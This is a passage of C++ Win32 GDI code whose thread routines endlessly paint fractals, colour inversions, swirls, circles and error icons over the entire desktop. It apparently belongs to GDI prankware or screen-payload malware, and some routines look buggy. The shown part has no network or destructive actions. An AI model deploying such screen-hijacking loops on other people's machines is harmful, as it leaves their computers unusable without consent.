    BYTE bgB = GetBValue(bgColor);

    BYTE fgR = GetRValue(fgColor);
    BYTE fgG = GetGValue(fgColor);
    BYTE fgB = GetBValue(fgColor);

    BYTE r = (BYTE)((1.0f - alpha) * bgR + alpha * fgR);
    BYTE g = (BYTE)((1.0f - alpha) * bgG + alpha * fgG);
    BYTE b = (BYTE)((1.0f - alpha) * bgB + alpha * fgB);

    return RGB(r, g, b);
}

void ApplyJuliaSetEffect(HDC hdcScreen) {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    int maxIterations = 100;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmScreen);

    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biWidth = screenW;
    bmi.bmiHeader.biHeight = -screenH;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;

    std::vector<COLORREF> pPixels(screenW * screenH);
    GetDIBits(hdcMem, hbmScreen, 0, screenH, pPixels.data(), &bmi, DIB_RGB_COLORS);

    for (int y = 0; y < screenH; ++y) {
        for (int x = 0; x < screenW; ++x) {
            int iterations = JuliaSet(x, y, maxIterations);
            float h = fmodf((float)iterations / (float)maxIterations + 0.5f, 1.0f);
            float s = 1.0f;
            float l = 0.5f;

            COLORREF fractalColor = HSLToRGB(h, s, l);

            COLORREF originalColor = pPixels[y * screenW + x];

            float r = GetRValue(originalColor) / 255.0f;
            float g = GetGValue(originalColor) / 255.0f;
            float b = GetBValue(originalColor) / 255.0f;
            if (r > 0.01f || g > 0.01f || b > 0.01f) {
                pPixels[y * screenW + x] = AlphaBlend(originalColor, fractalColor, ALPHA);
            }
        }
    }

    SetDIBits(hdcMem, hbmScreen, 0, screenH, pPixels.data(), &bmi, DIB_RGB_COLORS);

    BitBlt(hdcScreen, 0, 0, screenW, screenH, hdcMem, 0, 0, SRCCOPY);

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
}
void ApplyCustomRGBShader(HDC hdcScreen) {
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = screenW;
    bmi.bmiHeader.biHeight = screenH;

    RGBQUAD* rgbScreen = NULL;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    for (;;) {
        BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, 0, 0, SRCCOPY);

        for (int y = 0; y < screenH; ++y) {
            for (int x = 0; x < screenW; ++x) {
                int index = y * screenW + x;
                RGBQUAD& pixel = rgbScreen[index];

                pixel.rgbRed = max(0, pixel.rgbRed + (x - 50));
                pixel.rgbGreen = max(0, pixel.rgbGreen + (y - 100));
                pixel.rgbBlue = max(0, pixel.rgbBlue + ((x ^ y) - 150));
            }
        }

        BitBlt(hdcScreen, 0, 0, screenW, screenH, hdcMem, 0, 0, SRCCOPY);

        Sleep(10);

    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//GDIs
DWORD WINAPI Shader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            double fractalX = (0.f / w);
            double fractalY = (0.f / h);

            double cx = x * fractalX - 0.f;
            double cy = y * fractalY - 0.f;

            double zx = 0;
            double zy = 0;

            int fx = 0;

            while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
            {
                double fczx = zx * zx - zy * zy + cx;
                double fczy = 4 * zx * zy + cy;

                zx = fczx;
                zy = fczy;
                fx++;

                if (i % h == 0 && rand() % 1000)
                    v = rand() % 100;
                ((BYTE*)(data + i))[v ^ x ^ y ^ v & v] = fx;
                ((BYTE*)(data + i))[v >> x >> y >> v & v] = fx;
                ((BYTE*)(data + i))[v << x << y << v & v] = fx;
            }

        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI Blur1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int radius = 50.5f; double angle = 0;

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        SelectObject(hdcMem, 0);
        hdc = GetDC(NULL);
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        float x = cos(angle) * radius, y = sin(angle) * radius;
        StretchBlt(hdcCopy, rand() % 255, rand() % 255, w, h, hdc, 0, 0, w, h, SRCINVERT);
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
    return 0x00;
}
DWORD WINAPI BitBlt1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    int radius = -8.f; double angle = 0;
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biSize = sizeof(bmpi);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
        }
        float x = cos(angle) * radius, y = sin(angle) * radius;
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
        angle = fmod(angle + M_PI / radius, M_PI * radius);
    }
}
DWORD WINAPI BitBlt2(LPVOID lpParam) {
    HDC hdc;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int y, dx;

    std::srand(static_cast<unsigned int>(std::time(0)));

    while (1) {
        hdc = GetDC(0);
        y = rand() % h;
        dx = (rand() % 2) - 2;
        BitBlt(hdc, dx, y, w, 2, hdc, 0, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }

    return 0;
}
DWORD WINAPI Circles1(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        desk = GetDC(0);
        int radius = 20;
        int rx = rand() % sw;
        int ry = rand() % sh;

        for (int i = 0; i < 100; i++) {
            int x = radius + i * cos(i + radius * 1) + rx;
            int y = radius + i * sin(i + radius * 1) + ry;

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
            Sleep(10);
        }
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles2(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        desk = GetDC(0);
        int radius = 20;
        int rx = rand() % sw;
        int ry = rand() % sh;

        for (int i = 0; i < 100; i++) {
            int x = radius + i * sqrt(i + radius * 1) + rx;
            int y = radius + i * sin(i + radius * 1) + ry;

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
            Sleep(10);
        }
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles3(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        desk = GetDC(0);
        int radius = 20;
        int rx = rand() % sw;
        int ry = rand() % sh;

        for (int i = 0; i < 100; i++) {
            int x = radius + i * -sqrt(i + radius * 1) + rx;
            int y = radius + i * sin(i + radius * 1) + ry;

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
            Sleep(10);
        }
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles4(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        desk = GetDC(0);
        int radius = 20;
        int rx = rand() % sw;
        int ry = rand() % sh;

        for (int i = 0; i < 100; i++) {
            int x = radius + i * cos(i + radius * 1) + rx;
            int y = radius + i * sqrt(i + radius * 1) + ry;

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
            Sleep(10);
        }
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles5(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        desk = GetDC(0);
        int radius = 20;
        int rx = rand() % sw;
        int ry = rand() % sh;

        for (int i = 0; i < 100; i++) {
            int x = radius + i * cos(i + radius * 1) + rx;
            int y = radius + i * -sqrt(i + radius * 1) + ry;

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
            Sleep(10);
        }
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles6(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    int x[100], y[100], dx[100], dy[100];
    int radius = 20;

    for (int i = 0; i < 100; i++) {
        x[i] = rand() % (sw - 2 * radius) + radius;
        y[i] = rand() % (sh - 2 * radius) + radius;
        dx[i] = (rand() % 5 + 1) * (rand() % 2 == 0 ? 1 : -1);
        dy[i] = (rand() % 5 + 1) * (rand() % 2 == 0 ? 1 : -1);
    }

    while (1) {
        desk = GetDC(0);

        for (int i = 0; i < 100; i++) {
            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x[i] - radius, y[i] - radius, x[i] + radius, y[i] + radius);

            DeleteObject(brush);

            x[i] += dx[i];
            y[i] += dy[i];

            if (x[i] + radius > sw || x[i] - radius < 0) dx[i] = -dx[i];
            if (y[i] + radius > sh || y[i] - radius < 0) dy[i] = -dy[i];
        }

        Sleep(10);
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI Circles7(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    int radius = 20;
    int numCircles = 100;

    int cx = sw / 2, cy = sh / 2;
    int dx = 10, dy = 10;

    while (1) {
        desk = GetDC(0);

        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * 3;
            int x = cx + spiralRadius * cos(i * 0.2);
            int y = cy + spiralRadius * sin(i * 0.2);

            HBRUSH brush = CreateSolidBrush(GetRainbowColor(i));
            SelectObject(desk, brush);

            Ellipse(desk, x - radius, y - radius, x + radius, y + radius);

            DeleteObject(brush);
        }

        cx += dx;
        cy += dy;

        if (cx + radius > sw || cx - radius < 0) dx = -dx;
        if (cy + radius > sh || cy - radius < 0) dy = -dy;

        Sleep(10);
        ReleaseDC(0, desk);
    }

    return 0;
}
DWORD WINAPI ThreeDBouncingCube(LPVOID lpParam) {
    HDC desk = GetDC(0);

    int xVelocity = 5;
    int yVelocity = 5;
    int centerX = screenWidth / 2;
    int centerY = screenHeight / 2;
    double rotationAngle = 0.0;

    while (1) {
        desk = GetDC(0);

        DrawBouncingRotatingCube(desk, centerX, centerY, cubeSize, rotationAngle);

        centerX += xVelocity;
        centerY += yVelocity;

        if (centerX - cubeSize < 0 || centerX + cubeSize > screenWidth) xVelocity = -xVelocity;
        if (centerY - cubeSize < 0 || centerY + cubeSize > screenHeight) yVelocity = -yVelocity;

        rotationAngle += 0.05;

        ReleaseDC(0, desk);
        Sleep(30);
    }

    return 0;
}
DWORD WINAPI ColorShift(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, WIDTH, HEIGHT);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = WIDTH;
    bmi.bmiHeader.biHeight = -HEIGHT;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    std::vector<BYTE> pixels(WIDTH * HEIGHT * 4);
    double shift = 0.0;

    while (true) {
        HDC hdcMemScreen = GetDC(NULL);
        BitBlt(hdcMem, 0, 0, WIDTH, HEIGHT, hdcMemScreen, 0, 0, SRCCOPY);
        GetDIBits(hdcMem, hbmScreen, 0, HEIGHT, pixels.data(), &bmi, DIB_RGB_COLORS);

        ShiftColors(pixels.data(), WIDTH, HEIGHT, shift);

        SetDIBits(hdcMem, hbmScreen, 0, HEIGHT, pixels.data(), &bmi, DIB_RGB_COLORS);
        BitBlt(hdcScreen, 0, 0, WIDTH, HEIGHT, hdcMem, 0, 0, SRCCOPY);

        ReleaseDC(NULL, hdcMemScreen);

        shift += 0.01;

        Sleep(1);

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Swirl1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, WIDTH, HEIGHT);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmScreen);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = WIDTH;
    bmi.bmiHeader.biHeight = -HEIGHT;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    std::vector<BYTE> pixels(WIDTH * HEIGHT * 4);
    double time = 0.0;

    while (true) {
        HDC hdcMemScreen = GetDC(NULL);
        BitBlt(hdcMem, 0, 0, WIDTH, HEIGHT, hdcMemScreen, 0, 0, SRCCOPY);
        GetDIBits(hdcMem, hbmScreen, 0, HEIGHT, pixels.data(), &bmi, DIB_RGB_COLORS);

        ApplyWobbleEffect(pixels.data(), WIDTH, HEIGHT, time);

        SetDIBits(hdcMem, hbmScreen, 0, HEIGHT, pixels.data(), &bmi, DIB_RGB_COLORS);
        BitBlt(hdcScreen, 0, 0, WIDTH, HEIGHT, hdcMem, 0, 0, SRCCOPY);

        ReleaseDC(NULL, hdcMemScreen);

        time += 0.1;

        Sleep(1);

        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmScreen);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Icons1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HICON hIcon = LoadIcon(NULL, IDI_ERROR);

    int iconSize = 64;
    int spacing = 10;

    while (true) {
        for (int x = 0; x <= sw - iconSize; x += iconSize + spacing) {
            DrawIconEx(hdcScreen, x, 0, hIcon, iconSize, iconSize, 0, NULL, DI_NORMAL);
        }

        for (int y = 0; y <= sh - iconSize; y += iconSize + spacing) {
            DrawIconEx(hdcScreen, sw - iconSize, y, hIcon, iconSize, iconSize, 0, NULL, DI_NORMAL);
        }

        for (int x = sw - iconSize; x >= 0; x -= iconSize + spacing) {
            DrawIconEx(hdcScreen, x, sh - iconSize, hIcon, iconSize, iconSize, 0, NULL, DI_NORMAL);
        }

        for (int y = sh - iconSize; y >= 0; y -= iconSize + spacing) {
            DrawIconEx(hdcScreen, 0, y, hIcon, iconSize, iconSize, 0, NULL, DI_NORMAL);
        }

        Sleep(1);
    }

    ReleaseDC(NULL, hdcScreen);
    DestroyIcon(hIcon);

    return 0;
}
DWORD WINAPI Squares1(LPVOID lpParam){
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    int squareSize = 64;
    int spacing = 10;

    int hueMax = 360;

    while (true) {
        for (int x = 0; x <= sw - squareSize; x += squareSize + spacing) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(x, hueMax));
            SelectObject(hdcScreen, brush);
            Rectangle(hdcScreen, x, 0, x + squareSize, squareSize);
            DeleteObject(brush);
        }

        for (int y = 0; y <= sh - squareSize; y += squareSize + spacing) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(y, hueMax));
            SelectObject(hdcScreen, brush);
            Rectangle(hdcScreen, sw - squareSize, y, sw, y + squareSize);
            DeleteObject(brush);
        }

        for (int x = sw - squareSize; x >= 0; x -= squareSize + spacing) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(x, hueMax));
            SelectObject(hdcScreen, brush);
            Rectangle(hdcScreen, x, sh - squareSize, x + squareSize, sh);
            DeleteObject(brush);
        }

        for (int y = sh - squareSize; y >= 0; y -= squareSize + spacing) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(y, hueMax));
            SelectObject(hdcScreen, brush);
            Rectangle(hdcScreen, 0, y, squareSize, y + squareSize);
            DeleteObject(brush);
        }

        Sleep(1);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader2(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    int hueMax = 360;
    int lineWidth = 10;

    while (true) {
        for (int y = 0; y < sh; y += lineWidth) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(y, hueMax));
            SelectObject(hdcScreen, brush);

            RECT lineRect = { 0, y, sw, y + lineWidth };
            FillRect(hdcScreen, &lineRect, brush);
            DeleteObject(brush);
        }

        for (int x = 0; x < sw; x += lineWidth) {
            HBRUSH brush = CreateSolidBrush(GetHueColor(x, hueMax));
            SelectObject(hdcScreen, brush);

            RECT lineRect = { x, 0, x + lineWidth, sh };
            FillRect(hdcScreen, &lineRect, brush);
            DeleteObject(brush);
        }

        Sleep(100);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader3(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    float time = 0.0f;
    int resetInterval = 5000;
    DWORD lastResetTime = GetTickCount();

    while (true) {
        DWORD currentTime = GetTickCount();
        if (currentTime - lastResetTime >= resetInterval) {
            colorOffset = static_cast<float>(rand() % 360);
            lastResetTime = currentTime;
        }

        for (int y = 0; y < sh; y++) {
            for (int x = 0; x < sw; x++) {
                COLORREF color = GetHSLColor(x - sw / 2, y - sh / 2, time);

                SetPixel(hdcScreen, x, y, color);
            }
        }

        time += 0.1f;
        Sleep(10);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    float time = 0.0f;
    DWORD lastResetTime = GetTickCount();

    while (true) {
        DWORD currentTime = GetTickCount();
        if (currentTime - lastResetTime >= resetInterval) {
            colorOffset = static_cast<float>(rand() % 360);
            horizontalOffset = static_cast<float>(rand() % sw);
            lastResetTime = currentTime;
        }

        for (int y = 0; y < sh; y++) {
            for (int x = 0; x < sw; x++) {
                COLORREF color = GetHSLColor(x - sw / 2 + horizontalOffset, y - sh / 2, time);

                SetPixel(hdcScreen, x, y, color);
            }
        }

        time += 0.1f;
        Sleep(10);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader5(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    float time = 0.0f;
    DWORD lastResetTime = GetTickCount();

    while (true) {
        DWORD currentTime = GetTickCount();
        if (currentTime - lastResetTime >= resetInterval) {
            colorOffset = static_cast<float>(rand() % 360);
            lastResetTime = currentTime;
        }

        for (int y = 0; y < sh; y++) {
            for (int x = 0; x < sw; x++) {
                float waveX = x + waveAmplitude * sin(y * waveFrequency + time);
                float waveY = y + waveAmplitude * cos(x * waveFrequency + time);

                COLORREF color = GetHSLColor2(waveX - sw / 2, waveY - sh / 2, time);

                SetPixel(hdcScreen, x, y, color);
            }
        }

        time += 0.1f;
        Sleep(10);
    }

    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Circles8(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    float radius = 300;
    float angle = 45;
    float angleStep = 1;

    while (1) {
        hdc = GetDC(0);

        int cx = sw / 2;
        int cy = sh / 2;

        Draw3DSphere(hdc, cx, cy, radius, angle);

        angle += angleStep;
        if (angle > 360) angle -= 360;

        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0;
}
DWORD WINAPI Rings(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int radius = 150;

    int ballX = sw / 5;
    int ballY = sh / 5;
    int dx = 3, dy = 3;

    while (1) {
        hdc = GetDC(0);

        for (int i = 0; i < 360; i += 1) {
            for (int j = -radius; j <= radius; j += 40) {
                double angle = i * (M_PI / 180);
                int x = ballX + (int)(radius * cos(angle)) + j;
                int y = ballY + (int)(radius * sin(angle));

                double newX = (x - ballX) * tan(1) - (y - ballY) * tan(1) + ballX;
                double newY = (x - ballX) * sin(1) + (y - ballY) * sin(1) + ballY;

                HBRUSH brush = CreateSolidBrush(GetRainbowColor(angle));
                SelectObject(hdc, brush);
                Ellipse(hdc, newX - 10, newY - 10, newX + 10, newY + 10);
                DeleteObject(brush);
            }
        }

        if (ballX + radius > sw || ballX - radius < 0) dx = -dx;
        if (ballY + radius > sh || ballY - radius < 0) dy = -dy;
        ballX += dx;
        ballY += dy;

        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shake(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int shakeAmount = 30;

    CaptureAndShake(hdc, shakeAmount);

    ReleaseDC(NULL, hdc);
    return 0;
}
DWORD WINAPI Invert(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while (true) {
        InvertScreenColors(hdc, screenWidth, screenHeight);

        Sleep(10);
    }

    ReleaseDC(NULL, hdc);
    return 0;
}
DWORD WINAPI Shader6(LPVOID lpParam) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbScreen;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, hbmTemp);

    while (true) {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

        for (int i = 0; i < w * h; i++) {
            int x = i % w;
            int y = i / w;
            rgbScreen[i].rgbGreen = (rgbScreen[i].rgbRed ^ x) % 256;
            rgbScreen[i].rgbRed = (rgbScreen[i].rgbRed ^ y) % 256;
        }

        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);

        Sleep(40);
    }

    SelectObject(hdcMem, hbmOld);
    DeleteObject(hbmTemp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return 0;
}
DWORD WINAPI Shader7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

